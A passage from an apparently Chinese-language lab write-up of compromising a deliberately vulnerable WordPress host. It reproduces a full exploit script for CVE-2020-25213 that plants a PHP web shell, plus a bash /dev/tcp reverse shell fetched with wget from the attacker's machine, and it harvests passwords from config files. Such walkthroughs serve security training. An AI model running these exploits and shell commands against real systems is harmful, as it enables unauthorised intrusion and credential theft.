-&gt;  http:<span class="comment">//192.168.240.139/secret/wp-admin/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">330</span>B  - <span class="regexp">/secret/</span>wp-content  -&gt;  http:<span class="comment">//192.168.240.139/secret/wp-content/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">471</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/upgrade/</span>                       </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">301</span> -  <span class="number">331</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>  -&gt;  http:<span class="comment">//192.168.240.139/secret/wp-includes/</span></span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -  <span class="number">613</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/plugins/</span>akismet/akismet.php    </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -  <span class="number">613</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/plugins/</span>akismet/admin.php</span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">403</span> -  <span class="number">280</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>/                              </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">488</span>B  - <span class="regexp">/secret/</span>wp-content<span class="regexp">/uploads/</span>                       </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">200</span> -  <span class="number">514</span>B  - <span class="regexp">/secret/</span>wp-content/                               </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">36</span>] <span class="number">500</span> -    <span class="number">0</span>B  - <span class="regexp">/secret/</span>wp-<span class="keyword">includes</span>/rss-functions.php             </span><br><span class="line">[<span class="number">16</span>:<span class="number">42</span>:<span class="number">39</span>] <span class="number">500</span> -    <span class="number">3</span>KB - <span class="regexp">/secret/</span>wp-admin/setup-config.php </span><br></pre></td></tr></table></figure></div>
+<p>找到一些目录<br>wp-content这个目录是一些wordpress的文件 也只有这个目录下面有有用的信息<br><img src="https://pic1.imgdb.cn/item/679de013d0e0a243d4f973a0.png"></p>
+<p>找到了一个插件<br><img src="https://pic1.imgdb.cn/item/679ddfe5d0e0a243d4f9739e.png"><br>这里就不知道如何利用插件的漏洞了，看群主ll104567的视频有了后面的进展 先用searchsploit找到利用的py脚本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># searchsploit        wp-file-manager   </span></span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line"> Exploit Title                                                                     |  Path</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line">WP-<span class="built_in">file</span>-manager v6<span class="number">.9</span> - Unauthenticated Arbitrary File Upload leading <span class="built_in">to</span> RCE        | php/webapps/<span class="number">51224.</span>py</span><br><span class="line"><span class="comment">----------------------------------------------------------------------------------- ---------------------------------</span></span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># searchsploit -m 51224</span></span><br><span class="line">  Exploit: WP-<span class="built_in">file</span>-manager v6<span class="number">.9</span> - Unauthenticated Arbitrary File Upload leading <span class="built_in">to</span> RCE</span><br><span class="line">      <span class="built_in">URL</span>: <span class="keyword">https</span>://www.exploit-db.com/exploits/<span class="number">51224</span></span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/<span class="number">51224.</span>py</span><br><span class="line">    Codes: CVE<span class="number">-2020</span><span class="number">-25213</span></span><br><span class="line"> Verified: True</span><br><span class="line">File Type: Python script, ASCII <span class="keyword">text</span> executable, <span class="keyword">with</span> very <span class="keyword">long</span> <span class="keyword">lines</span> (<span class="number">501</span>)</span><br><span class="line">Copied <span class="built_in">to</span>: /root/tmp/<span class="number">51224.</span>py</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>查看这个脚本做了什么</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># cat 51224.py                             </span></span><br><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE</span></span><br><span class="line"><span class="comment"># Date: [ 22-01-2023 ]</span></span><br><span class="line"><span class="comment"># Exploit Author: [BLY]</span></span><br><span class="line"><span class="comment"># Vendor Homepage: [https://wpscan.com/vulnerability/10389]</span></span><br><span class="line"><span class="comment"># Version: [ File Manager plugin 6.0-6.9]</span></span><br><span class="line"><span class="comment"># Tested on: [ Debian ]</span></span><br><span class="line"><span class="comment"># CVE : [ CVE-2020-25213 ]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">import</span> sys,signal,time,requests</span><br><span class="line">from bs4 <span class="built_in">import</span> BeautifulSoup</span><br><span class="line"><span class="comment">#from pprint import pprint</span></span><br><span class="line"></span><br><span class="line">def handler(sig,frame):</span><br><span class="line">	print (<span class="string">&quot;[!]Saliendo&quot;</span>)</span><br><span class="line">	sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT,handler)</span><br><span class="line"></span><br><span class="line">def commandexec(command):</span><br><span class="line"></span><br><span class="line">	<span class="attr">exec_url</span> <span class="operator">=</span> url<span class="operator">+</span><span class="string">&quot;/wp-content/plugins/wp-file-manager/lib/php/../files/shell.php&quot;</span></span><br><span class="line">	<span class="attr">params</span> <span class="operator">=</span> &#123;</span><br><span class="line">		<span class="string">&quot;cmd&quot;</span>:command</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="attr">r</span><span class="operator">=</span>requests.get(exec_url,params<span class="operator">=</span>params)</span><br><span class="line"></span><br><span class="line">	<span class="attr">soup</span> <span class="operator">=</span> BeautifulSoup(r.text, &#x27;html.parser&#x27;)</span><br><span class="line">	<span class="attr">text</span> <span class="operator">=</span> soup.get_text()</span><br><span class="line"></span><br><span class="line">	print (text)</span><br><span class="line">def exploit():</span><br><span class="line"></span><br><span class="line">	global url</span><br><span class="line"></span><br><span class="line">	<span class="attr">url</span> <span class="operator">=</span> sys.argv[<span class="number">1</span>]</span><br><span class="line">	<span class="attr">command</span> <span class="operator">=</span> sys.argv[<span class="number">2</span>]</span><br><span class="line">	<span class="attr">upload_url</span> <span class="operator">=</span> url<span class="operator">+</span><span class="string">&quot;/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="attr">headers</span> <span class="operator">=</span> &#123;</span><br><span class="line">			&#x27;<span class="params">content-type&#x27;:</span> <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryvToPIGAB0m9SB1Ww&quot;</span>,</span><br><span class="line">			&#x27;<span class="params">Connection&#x27;:</span> <span class="string">&quot;close&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="attr">payload</span> <span class="operator">=</span> <span class="string">&quot;------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>cmd<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>upload<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>target<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>l1_Lw<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww<span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Disposition: form-data; name=<span class="char escape_">\&quot;</span>upload[]<span class="char escape_">\&quot;</span>; filename=<span class="char escape_">\&quot;</span>shell.php<span class="char escape_">\&quot;</span><span class="char escape_">\r</span><span class="char escape_">\n</span>Content-Type: application/x-php<span class="char escape_">\r</span><span class="char escape_">\n</span><span class="char escape_">\r</span><span class="char escape_">\n</span>&lt;?php echo <span class="char escape_">\&quot;</span>&lt;pre&gt;<span class="char escape_">\&quot;</span> . shell_exec($_REQUEST[&#x27;cmd&#x27;]) . <span class="char escape_">\&quot;</span>&lt;/pre&gt;<span class="char escape_">\&quot;</span>; ?&gt;<span class="char escape_">\r</span><span class="char escape_">\n</span>------WebKitFormBoundaryvToPIGAB0m9SB1Ww--&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="params">try:</span></span><br><span class="line">		<span class="attr">r</span><span class="operator">=</span>requests.post(upload_url,data<span class="operator">=</span>payload,headers<span class="operator">=</span>headers)</span><br><span class="line">		<span class="comment">#pprint(r.json())</span></span><br><span class="line">		commandexec(command)</span><br><span class="line">	<span class="params">except:</span></span><br><span class="line">		print(<span class="string">&quot;[!] Algo ha salido mal...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def help():</span><br><span class="line"></span><br><span class="line">	print (<span class="string">&quot;<span class="char escape_">\n</span>[*] Uso: python3&quot;</span>,sys.argv[<span class="number">0</span>],<span class="string">&quot;<span class="char escape_">\&quot;</span>url<span class="char escape_">\&quot;</span> <span class="char escape_">\&quot;</span>comando<span class="char escape_">\&quot;</span>&quot;</span>)</span><br><span class="line">	print (<span class="string">&quot;[!] Ejemplo: python3&quot;</span>,sys.argv[<span class="number">0</span>],<span class="string">&quot;http://wordpress.local/ id&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ <span class="operator">==</span> &#x27;<span class="params">__main__&#x27;:</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) <span class="operator">!=</span> <span class="number">3</span>:</span><br><span class="line">		help()</span><br><span class="line"></span><br><span class="line">	<span class="params">else:</span></span><br><span class="line">		exploit()                                                                                                                     </span><br></pre></td></tr></table></figure></div>
+<p>可以直接到web访问路径&#x2F;&#x2F;wp-content&#x2F;plugins&#x2F;wp-file-manager&#x2F;lib&#x2F;files&#x2F;shell.php<br>后面?cmd&#x3D; 传入要执行的命令也可以</p>
+<p>cmd传入命令 然后执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span>               </span><br><span class="line"></span><br><span class="line">[*] Uso: <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> <span class="string">&quot;url&quot;</span> <span class="string">&quot;comando&quot;</span></span><br><span class="line">[!] Ejemplo: <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> http://wordpress.local/ id</span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> http://<span class="number">192.168</span>.<span class="number">240.139</span>/secret id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure></div>
+<p>根据使用示例知道了用法 把id改成要执行的命令<br>然后反弹shell  但是这里用nc没有办法反弹回shell<br>用另外一种方式  写一个reverse.sh</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="number">192.168.240.83</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>   </span><br></pre></td></tr></table></figure></div>
+<p>启动http服务 让web那边可以接受到本机的文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COFFEESCRIPT"><figure class="iseeu highlight /coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># python3 -m http.   server                                                              </span></span><br><span class="line">Serving HTTP <span class="literal">on</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">8000</span> (http:<span class="regexp">//0.0.0.0:8000/</span>) ...</span><br></pre></td></tr></table></figure></div>
+<p>在web端输入</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">cmd</span>=wget 192.168.240.83:8000/reverse.sh</span><br><span class="line">?<span class="attribute">cmd</span>=bash reverse.sh</span><br></pre></td></tr></table></figure></div>
+<p>拿到shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -<span class="keyword">lp</span> <span class="number">1234</span></span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="keyword">set</span> terminal process group (<span class="number">650</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="keyword">no</span> job control in this <span class="keyword">shell</span></span><br><span class="line">&lt;ress/<span class="keyword">wp</span>-content/plugins/<span class="keyword">wp</span>-<span class="keyword">file</span>-manager/lib/<span class="keyword">files</span>$ id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">&lt;ress/<span class="keyword">wp</span>-content/plugins/<span class="keyword">wp</span>-<span class="keyword">file</span>-manager/lib/<span class="keyword">files</span>$ </span><br></pre></td></tr></table></figure></div>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>根据最开始的提示有信息的php文件，找到这个文件，查看内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@vulny</span><span class="symbol">:/etc/wordpress</span><span class="variable">$ </span>cat config-<span class="number">192.168</span>.<span class="number">1.122</span>.php</span><br><span class="line">cat config-<span class="number">192.168</span>.<span class="number">1.122</span>.php</span><br><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;myfuckingpassword&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;utf8_general_ci&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/wp-content&#x27;</span>);</span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line">www-data<span class="variable">@vulny</span><span class="symbol">:/etc/wordpress</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
+<p>这里有数据库密码 myfuckingpassword<br>看了wp 在去&#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;wp-config.php中找内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">www-data@vulny:/usr/share/wordpress$ cat wp-config.php</span><br><span class="line">cat wp-config.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * WordPress&#x27;s Debianised default master config file</span></span><br><span class="line"><span class="comment"> * Please do NOT edit and learn how the configuration works in</span></span><br><span class="line"><span class="comment"> * /usr/share/doc/wordpress/README.Debian</span></span><br><span class="line"><span class="comment"> ***/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look up a host-specific config file in</span></span><br><span class="line"><span class="comment"> * /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/:.*/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]);</span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.\-]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="comment">/* Main site in case of multisite with subdomains */</span></span><br><span class="line"><span class="variable">$debian_main_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/^[^.]*\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_main_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_main_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_main_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_main_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_main_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.0 404 Not Found&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Neither &lt;b&gt;<span class="subst">$debian_file</span>&lt;/b&gt; nor &lt;b&gt;<span class="subst">$debian_main_file</span>&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* idrinksomewater */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for some constants if they have not yet been set</span></span><br><span class="line"><span class="comment">   by the host-specific config files */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;ABSPATH&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;ABSPATH&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_NAME&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_USER&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_HOST&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DONT_SET_WP_CONTENT_DIR&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/var/lib/wordpress/wp-content&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for the table_prefix variable so that it doesn&#x27;t need to</span></span><br><span class="line"><span class="comment">   be put in every host-specific config file */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$table_prefix</span>)) &#123;</span><br><span class="line">    <span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>] == <span class="string">&#x27;https&#x27;</span>)</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] = <span class="string">&#x27;on&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>有一个注释<code>/* idrinksomewater */</code>  这个 就是用户的密码，用户在home目录有显示名称<br>查看sudo-l</p>
